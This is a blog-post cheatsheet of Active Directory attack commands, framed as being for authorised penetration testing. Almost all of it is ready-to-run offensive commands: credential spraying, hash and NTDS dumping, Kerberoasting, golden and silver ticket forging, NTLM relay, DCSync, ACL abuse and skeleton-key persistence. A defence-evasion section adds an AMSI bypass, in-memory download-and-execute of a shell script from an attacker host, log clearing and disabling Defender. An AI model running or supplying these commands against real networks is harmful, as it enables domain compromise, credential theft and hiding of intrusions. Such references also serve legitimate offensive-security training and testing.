---
layout: post
title: "active-directory-cheatsheet"
description: "A comprehensive Active Directory reference covering enumeration, credential attacks, lateral movement, persistence, and defence evasion."
---

> **Disclaimer:** This cheatsheet is for authorised penetration testing and educational purposes only. Never use these techniques against systems you do not own or have explicit written permission to test.

---

## Table of Contents

- [Environment Setup](#environment-setup)
- [Initial Enumeration (Unauthenticated)](#initial-enumeration-unauthenticated)
- [Authenticated Enumeration](#authenticated-enumeration)
- [BloodHound](#bloodhound)
- [Credential Attacks](#credential-attacks)
- [Kerberos Attacks](#kerberos-attacks)
- [Lateral Movement](#lateral-movement)
- [Domain Privilege Escalation](#domain-privilege-escalation)
- [Domain Persistence](#domain-persistence)
- [Certificate Services (AD CS)](#certificate-services-ad-cs)
- [Trusts and Forest Attacks](#trusts-and-forest-attacks)
- [Defence Evasion](#defence-evasion)
- [Useful One-Liners](#useful-one-liners)

---

## Environment Setup

```bash
# Add domain and DC to /etc/hosts
echo "10.10.10.1  domain.htb dc01.domain.htb" >> /etc/hosts

# Sync time with the DC (required for Kerberos)
sudo ntpdate domain.htb

# Set up a credentials file for repeated use
export DOMAIN="domain.htb"
export DC="10.10.10.1"
export USER="username"
export PASS="password"
```

---

## Initial Enumeration (Unauthenticated)

### Host and Port Discovery

```bash
# Standard scan with service detection against a DC
nmap -sS -sV -sC -O -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 $DC

# Identify all hosts in a subnet
nmap -sn 10.10.10.0/24

# Full port scan — slower but thorough
nmap -sS -p- -T4 $DC
```

### SMB Enumeration (No Credentials)

```bash
# List shares anonymously
smbclient -L //$DC -N

# Check SMB signing and version
netexec smb $DC

# Enumerate shares with null session
smbmap -H $DC

# Recursive listing of a share
smbclient //$DC/sharename -N -c 'recurse;prompt OFF;ls'

# Download all files from a share
smbclient //$DC/sharename -N -c 'recurse;prompt OFF;mget *'
```

### LDAP Enumeration (No Credentials)

```bash
# Attempt anonymous LDAP bind and dump base info
ldapsearch -x -H ldap://$DC -s base namingcontexts

# Dump all LDAP objects anonymously (often restricted)
ldapsearch -x -H ldap://$DC -b "DC=domain,DC=htb"

# Use windapsearch for cleaner output
windapsearch -d $DOMAIN --dc $DC -m users
windapsearch -d $DOMAIN --dc $DC -m groups
windapsearch -d $DOMAIN --dc $DC -m computers
```

### RPC Enumeration (No Credentials)

```bash
# Connect via null session
rpcclient -U "" -N $DC

# Inside rpcclient
enumdomusers           # list all domain users
enumdomgroups          # list all domain groups
querydominfo           # domain info
lsaquery               # LSA policy info
lookupnames Administrator  # resolve a username to SID
```

### Kerbrute — Username Enumeration

```bash
# Enumerate valid usernames without authentication (uses Kerberos AS-REQ)
kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/Names/names.txt

# Build a username list from a pattern and enumerate
kerbrute userenum -d $DOMAIN --dc $DC usernames.txt
```

---

## Authenticated Enumeration

### NetExec (nxc / crackmapexec)

```bash
# Validate credentials against SMB
netexec smb $DC -u $USER -p $PASS

# Enumerate shares with credentials
netexec smb $DC -u $USER -p $PASS --shares

# Dump domain users
netexec smb $DC -u $USER -p $PASS --users

# Dump domain groups
netexec smb $DC -u $USER -p $PASS --groups

# Dump local admins on a host
netexec smb $DC -u $USER -p $PASS --local-groups

# Password policy (useful for spraying safely)
netexec smb $DC -u $USER -p $PASS --pass-pol

# Run a command on a remote host
netexec smb $DC -u $USER -p $PASS -x "whoami"

# Check WinRM access
netexec winrm $DC -u $USER -p $PASS

# Spray a password across a user list
netexec smb $DC -u users.txt -p 'Password123!' --continue-on-success
```

### LDAP Enumeration (Authenticated)

```bash
# Dump all users with windapsearch
windapsearch -d $DOMAIN --dc $DC -u $USER -p $PASS -m users --full

# Dump all computers
windapsearch -d $DOMAIN --dc $DC -u $USER -p $PASS -m computers --full

# Find users with adminCount=1 (privileged accounts)
windapsearch -d $DOMAIN --dc $DC -u $USER -p $PASS -m privileged-users

# Find unconstrained delegation accounts
windapsearch -d $DOMAIN --dc $DC -u $USER -p $PASS --unconstrained-users
windapsearch -d $DOMAIN --dc $DC -u $USER -p $PASS --unconstrained-computers

# Raw LDAP query for users with SPN (kerberoastable)
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w $PASS \
  -b "DC=domain,DC=htb" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

### PowerView (from a Windows foothold)

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Basic domain info
Get-Domain
Get-DomainController
Get-DomainPolicy

# User enumeration
Get-DomainUser                              # all domain users
Get-DomainUser -Identity username           # specific user
Get-DomainUser -Properties samaccountname,description,memberof  # useful properties
Get-DomainUser -UACFilter DONT_REQ_PREAUTH  # ASREPRoastable users
Get-DomainUser -SPN                         # kerberoastable users

# Group enumeration
Get-DomainGroup                             # all groups
Get-DomainGroupMember "Domain Admins"       # members of a group
Get-DomainGroup -AdminCount                 # privileged groups

# Computer enumeration
Get-DomainComputer                          # all computers
Get-DomainComputer -Unconstrained           # unconstrained delegation
Get-DomainComputer -TrustedToAuth           # constrained delegation

# GPO enumeration
Get-DomainGPO                               # all GPOs
Get-DomainGPOLocalGroup                     # GPOs assigning local admin rights

# ACL enumeration
Get-DomainObjectAcl -Identity "username" -ResolveGUIDs  # ACLs on a user
Find-InterestingDomainAcl -ResolveGUIDs     # find interesting ACL misconfigurations

# Find local admins across the domain (noisy)
Find-LocalAdminAccess

# Find where a user is logged in
Find-DomainUserLocation -UserIdentity username

# Trust enumeration
Get-DomainTrust
Get-ForestTrust
```

---

## BloodHound

### Collection

```bash
# Python-based collector from Linux (no foothold needed)
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $DC

# SharpHound from a Windows foothold
.\SharpHound.exe -c All --zipfilename output.zip

# SharpHound — stealth collection (less noisy)
.\SharpHound.exe -c DCOnly

# Collect and compress in one step
.\SharpHound.exe -c All --Loop --LoopDuration 00:15:00
```

### Useful BloodHound Queries

Once data is imported, run these in the Raw Query box:

```cypher
# Find all paths to Domain Admins
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.HTB"})) RETURN p

# Find kerberoastable users with paths to DA
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.HTB"})) RETURN p

# Find all computers where Domain Admins are logged in
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.HTB"}) RETURN c,u

# Find users with DCSync rights
MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u

# Find all ASREPRoastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u

# Find users with unconstrained delegation
MATCH (u:User {unconstraineddelegation:true}) RETURN u
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

---

## Credential Attacks

### Password Spraying

```bash
# Spray with netexec — always check lockout policy first
netexec smb $DC -u $USER -p $PASS --pass-pol

# Spray a single password across all users
netexec smb $DC -u users.txt -p 'Password123!' --continue-on-success

# Spray via Kerberos (less noisy than SMB)
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Password123!'

# Spray with a delay between attempts (safer)
netexec smb $DC -u users.txt -p 'Password123!' --continue-on-success --jitter 2
```

### Hash Dumping

```bash
# Dump SAM hashes (local accounts) via SMB
netexec smb $DC -u $USER -p $PASS --sam

# Dump LSA secrets
netexec smb $DC -u $USER -p $PASS --lsa

# Dump NTDS.dit (domain hashes) — requires DA
netexec smb $DC -u $USER -p $PASS --ntds

# secretsdump via impacket — all-in-one
secretsdump.py $DOMAIN/$USER:$PASS@$DC

# secretsdump with NTLM hash (Pass-the-Hash)
secretsdump.py -hashes :NTLMhash $DOMAIN/$USER@$DC
```

### Pass-the-Hash

```bash
# WinRM with hash
evil-winrm -i $DC -u $USER -H NTLMhash

# SMB with hash
netexec smb $DC -u $USER -H NTLMhash

# Execute command via hash
psexec.py -hashes :NTLMhash $DOMAIN/$USER@$DC

# secretsdump with hash
secretsdump.py -hashes :NTLMhash $DOMAIN/$USER@$DC
```

### Pass-the-Ticket

```bash
# Export tickets from a Windows host (Mimikatz)
sekurlsa::tickets /export

# Import a ticket into the current session (Linux)
export KRB5CCNAME=/path/to/ticket.ccache

# Use the ticket with impacket tools
psexec.py -k -no-pass $DOMAIN/username@target.domain.htb
wmiexec.py -k -no-pass $DOMAIN/username@target.domain.htb
```

### NTLM Relay

```bash
# Disable SMB and HTTP in Responder config first, then run:
sudo responder -I tun0 -wd

# Relay captured hashes to a target (requires SMB signing disabled)
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Relay and dump SAM
sudo ntlmrelayx.py -tf targets.txt -smb2support --sam

# Interactive SMB shell via relay
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

---

## Kerberos Attacks

### ASREPRoasting

Targets accounts with "Do not require Kerberos preauthentication" set. No credentials needed.

```bash
# From Linux — get AS-REP hashes
GetNPUsers.py $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat

# With valid credentials
GetNPUsers.py $DOMAIN/$USER:$PASS -dc-ip $DC -request -format hashcat

# PowerView — find ASREPRoastable users
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname

# Crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

Targets service accounts with SPNs. Requires any valid domain account.

```bash
# From Linux — request TGS tickets for all SPNs
GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerberoast.txt

# Target a specific user
GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC -request-user svcaccount

# From Windows (PowerView)
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\spns.csv

# Crack the TGS hash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### Unconstrained Delegation

If a computer or user has unconstrained delegation, any TGT that authenticates to it is cached in memory.

```bash
# Find unconstrained delegation hosts
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# On the unconstrained host — monitor for incoming TGTs (Rubeus)
Rubeus.exe monitor /interval:5 /nowrap

# Coerce a DC to authenticate to the unconstrained host (PrinterBug)
SpoolSample.exe dc01.domain.htb unconstrained.domain.htb

# Extract and use the DC TGT
Rubeus.exe ptt /ticket:base64ticket
```

### Constrained Delegation

```bash
# Find constrained delegation accounts
Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto

# Request a service ticket on behalf of another user (S4U2Self + S4U2Proxy)
getST.py -spn cifs/target.domain.htb -impersonate Administrator $DOMAIN/$USER:$PASS

# Use the ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass $DOMAIN/Administrator@target.domain.htb
```

### Golden Ticket

Requires the KRBTGT hash (post-DA compromise). Forges TGTs that never expire.

```bash
# Get KRBTGT hash (post-compromise)
secretsdump.py $DOMAIN/Administrator:$PASS@$DC

# Get domain SID
lookupsid.py $DOMAIN/Administrator:$PASS@$DC | grep "Domain SID"

# Forge a golden ticket (impacket)
ticketer.py -nthash KRBTGThash -domain-sid S-1-5-21-... -domain $DOMAIN Administrator

# Use the golden ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass $DOMAIN/Administrator@dc01.domain.htb
```

### Silver Ticket

Forges TGS tickets for a specific service using the service account hash. Stealthier than golden tickets.

```bash
# Forge a silver ticket for CIFS on a target
ticketer.py -nthash ServiceAccountHash -domain-sid S-1-5-21-... -domain $DOMAIN \
  -spn cifs/target.domain.htb Administrator

# Use the silver ticket
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass //$DC/C$
```

---

## Lateral Movement

### WinRM

```bash
evil-winrm -i target -u $USER -p $PASS        # password auth
evil-winrm -i target -u $USER -H NTLMhash     # hash auth
evil-winrm -i target -u $USER -p $PASS -s /path/to/scripts/  # load PS scripts
```

### PSExec / WMI / DCOM

```bash
# PSExec — spawns a SYSTEM shell via SMB service creation (noisy)
psexec.py $DOMAIN/$USER:$PASS@target

# WMIExec — uses WMI (less noisy, no service creation)
wmiexec.py $DOMAIN/$USER:$PASS@target

# SMBExec — uses SMB without dropping a binary
smbexec.py $DOMAIN/$USER:$PASS@target

# DCOMExec — uses DCOM
dcomexec.py $DOMAIN/$USER:$PASS@target
```

### RDP

```bash
# Connect via RDP
xfreerdp /u:$USER /p:$PASS /d:$DOMAIN /v:target /dynamic-resolution +clipboard

# Connect with hash (Restricted Admin mode must be enabled)
xfreerdp /u:$USER /pth:NTLMhash /d:$DOMAIN /v:target /dynamic-resolution
```

---

## Domain Privilege Escalation

### DCSync

Requires GenericAll, DCSync, or Replication rights on the domain object.

```bash
# Dump all hashes via DCSync (impacket)
secretsdump.py $DOMAIN/$USER:$PASS@$DC

# Dump a specific account
secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user Administrator

# Mimikatz on Windows
lsadump::dcsync /domain:domain.htb /user:Administrator
lsadump::dcsync /domain:domain.htb /all /csv
```

### ACL Abuse

```bash
# GenericAll on a user — reset their password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericAll on a group — add yourself
Add-DomainGroupMember -Identity "Domain Admins" -Members $USER

# WriteDACL on domain object — grant yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=htb" -PrincipalIdentity $USER -Rights DCSync

# ForceChangePassword right — change user password without knowing current
$cred = New-Object System.Management.Automation.PSCredential('domain\user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Credential $cred

# WriteOwner — take ownership of an object then grant yourself rights
Set-DomainObjectOwner -Identity targetobject -OwnerIdentity $USER
Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity $USER -Rights All
```

### Resource-Based Constrained Delegation (RBCD)

Requires write access to a computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

```bash
# Create a fake computer account
addcomputer.py -computer-name 'FAKE$' -computer-pass 'FakePass123!' $DOMAIN/$USER:$PASS

# Set RBCD — allow FAKE$ to delegate to target
rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER:$PASS

# Request a service ticket impersonating Administrator
getST.py -spn cifs/target.domain.htb -impersonate Administrator $DOMAIN/'FAKE$':'FakePass123!'

# Use the ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass $DOMAIN/Administrator@target.domain.htb
```

---

## Domain Persistence

### Skeleton Key

Patches LSASS on the DC so any account can authenticate with a master password. Does not survive reboots.

```powershell
# Mimikatz — inject skeleton key (requires DA)
privilege::debug
misc::skeleton
# Now any account can auth with password "mimikatz"
```

### AdminSDHolder

Modifies the AdminSDHolder template, which propagates permissions to all protected groups every 60 minutes.

```powershell
# Grant a user GenericAll on AdminSDHolder (propagates to all DA-equivalent objects)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=htb" \
  -PrincipalIdentity backdooruser -Rights All
```

### DSRM Account

The Directory Services Restore Mode password can be used to authenticate locally on a DC even if the domain is down.

```powershell
# Dump the DSRM hash (Mimikatz)
lsadump::lsa /patch
token::elevate
lsadump::sam

# Enable DSRM network logon via registry
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

---

## Certificate Services (AD CS)

### Enumeration

```bash
# Enumerate AD CS from Linux
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC

# Find vulnerable templates
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
```

### ESC1 — Misconfigured Certificate Template

Template allows Subject Alternative Name (SAN) and allows any domain user to enroll.

```bash
# Request a cert as Administrator using a vulnerable template
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "CA-NAME" -template "VulnTemplate" -upn Administrator@$DOMAIN

# Authenticate with the certificate and get the NTLM hash
certipy auth -pfx administrator.pfx -dc-ip $DC
```

### ESC8 — NTLM Relay to AD CS HTTP Endpoint

```bash
# Start relay targeting the CA web enrollment
sudo ntlmrelayx.py -t http://ca.domain.htb/certsrv/certfnsh.asp \
  -smb2support --adcs --template "DomainController"

# Coerce DC authentication (PetitPotam)
python3 PetitPotam.py -u $USER -p $PASS attacker_ip dc01.domain.htb

# Authenticate with the obtained certificate
certipy auth -pfx dc01.pfx -dc-ip $DC
```

---

## Trusts and Forest Attacks

```bash
# Enumerate trusts
Get-DomainTrust
Get-ForestTrust
nltest /domain_trusts

# Find foreign group members (users from one domain in another domain's groups)
Get-DomainForeignGroupMember

# SID History injection (cross-forest privilege escalation)
# Requires compromise of a trust anchor — adds Enterprise Admin SID to TGT
ticketer.py -nthash KRBTGThash -domain-sid S-1-5-21-childdomain... \
  -domain child.domain.htb -extra-sid S-1-5-21-rootdomain...-519 Administrator
```

---

## Defence Evasion

```bash
# Check if AMSI is active and bypass (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass execution policy for the current session
Set-ExecutionPolicy Bypass -Scope Process -Force

# Download and execute in memory (avoid touching disk)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.45/script.ps1')

# Encode a command to avoid string detection
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.45/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Clear PowerShell event logs
Remove-EventLog -LogName "Windows PowerShell"
Clear-EventLog -LogName "Security"

# Disable Windows Defender real-time protection (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Add exclusion path to Defender
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

---

## Useful One-Liners

```bash
# Find all domain controllers
netexec smb $DC -u $USER -p $PASS --dc-list

# Find hosts with SMB signing disabled (relay targets)
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Find accounts with passwords not expiring
Get-DomainUser -PasswordNeverExpires | Select-Object samaccountname

# Find accounts with passwords older than 90 days
Get-DomainUser | Where-Object {$_.pwdlastset -lt (Get-Date).AddDays(-90)} | Select-Object samaccountname,pwdlastset

# Find computers that haven't checked in for 90 days (stale objects)
Get-DomainComputer | Where-Object {$_.lastlogontimestamp -lt (Get-Date).AddDays(-90).ToFileTime()} | Select-Object dnshostname

# Find description fields containing passwords (common misconfiguration)
Get-DomainUser | Where-Object {$_.description -like "*pass*"} | Select-Object samaccountname,description
Get-DomainComputer | Where-Object {$_.description -like "*pass*"} | Select-Object dnshostname,description

# Extract all usernames cleanly from netexec output
netexec smb $DC -u $USER -p $PASS --users | grep -oP '[\w\.-]+(?=\s)' | sort -u > users.txt

# Check if current user has local admin anywhere in the domain
Find-LocalAdminAccess

# Quickly check which hosts allow WinRM
netexec winrm 10.10.10.0/24 -u $USER -p $PASS

# Coerce DC authentication with PetitPotam (unauthenticated)
python3 PetitPotam.py attacker_ip dc01.domain.htb

# Resolve all computer hostnames to IPs
Get-DomainComputer | Select-Object dnshostname | ForEach-Object { Resolve-DnsName $_.dnshostname -ErrorAction SilentlyContinue }
```
